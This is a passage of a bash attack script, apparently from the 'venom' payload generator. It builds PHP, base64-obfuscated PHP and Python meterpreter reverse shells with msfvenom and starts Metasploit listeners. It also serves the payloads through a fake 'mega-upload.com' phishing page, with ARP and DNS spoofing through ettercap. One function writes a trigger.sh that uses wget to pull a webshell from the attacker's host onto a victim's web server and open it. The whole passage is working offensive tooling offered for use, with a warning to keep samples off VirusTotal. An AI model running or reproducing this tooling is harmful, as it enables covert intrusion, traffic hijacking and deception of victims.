        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

fi




sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/backdoor.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.py > /dev/null 2>&1
rm $IPATH/output/template.c > /dev/null 2>&1
rm $ApAcHe/$N4m.pdf > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}






# ------------------------------------------------------
# build shellcode in PHP (webserver stager)
# php/meterpreter raw format OR php/base64 format
# Thanks to my friend 'egypt7' from rapid7 for this one
# interactive kali-apache2 php exploit (by me)
# ------------------------------------------------------
sh_shellcode16 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: egypt7" --entry --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="egypt7";fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PHP - WEBSHELL
    |_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m.php"

echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
# delete bad chars in php payload
echo "[☠] deleting webshell.php junk..."
sleep 2
cd $IPATH/output



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else


     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}




sh_webshellbase () {
# ----------------------
# BASE64 ENCODED PAYLOAD
# ----------------------
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: egypt7b64" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="egypt7b64";fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PHP -> WEBSHELL
    |_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.php
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else

     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}





# ------------------------------
# BASE64 MY UNIX APACHE2 EXPLOIT
# ------------------------------
sh_webshellunix () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
RRh0St=$(zenity --title="☠ TARGET IP ADRRESS ☠" --text "example: 192.168.1.69" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: UnixApacheExploit" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="UnixApacheExploit";fi
if [ -z "$RRh0St" ]; then echo "${RedF}[x]${white} This Module Requires Target ip addr input";sleep 3; sh_exit;fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | RHOST   : $RRh0St
    | FORMAT  : PHP -> APACHE2 (linux)
    |_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


cd $IPATH/output/
# injecting settings into trigger.sh
echo "[☠] building  -> trigger.sh!"
sleep 2

echo "#!/bin/sh" > trigger.sh
echo "# bash template | Author: r00t-3xp10it" >> trigger.sh
echo "echo \"[*] Please wait, preparing software ..\"" >> trigger.sh
echo "wget -q -O /var/www/html/$N4m.php http://$lhost/$N4m.php && /etc/init.d/apache2 start && xdg-open http://$RRh0St/$N4m.php" >> trigger.sh
chmod +x $IPATH/output/trigger.sh > /dev/null 2>&1


cd $IPATH/templates/
# injecting shellcode into name.php
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# edit files nedded
cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|trigger.sh|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
# copy from output
cd $IPATH/output
cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
cp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}







# -----------------------------------------------------------------
# build shellcode in PYTHON (multi OS)
# just because ive liked the python payload from veil i decided
# to make another one to all operative systems (python/meterpreter)
# P.S. python outputs in venom uses (windows/meterpreter) ;)
# -----------------------------------------------------------------
sh_shellcode17 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Harmj0y" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Harmj0y";fi

echo "[☠] Building shellcode -> python language..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PYTHON -> MULTI OS
    |_PAYLOAD : python/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/chars.raw"
st0r3=`cat $IPATH/output/chars.raw`
disp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d ')' -f1`

# display shellcode
# cat $IPATH/output/chars.raw
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc9 $IPATH/templates/exec0[bak].py
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc9 ]; then
      echo "[☠] exec0.py -> found!"
      sleep 2
 
   else

      echo "[☠] exec0.py -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



# injecting shellcode into name.py
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.py!"
sleep 2
echo "[☠] Make it executable..."
sleep 2
sed "s|InJEc|$disp|g" exec0.py > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py
cUe=`echo $N4m.py | cut -d '.' -f1`


# CHOSE HOW TO DELIVER YOUR PAYLOAD
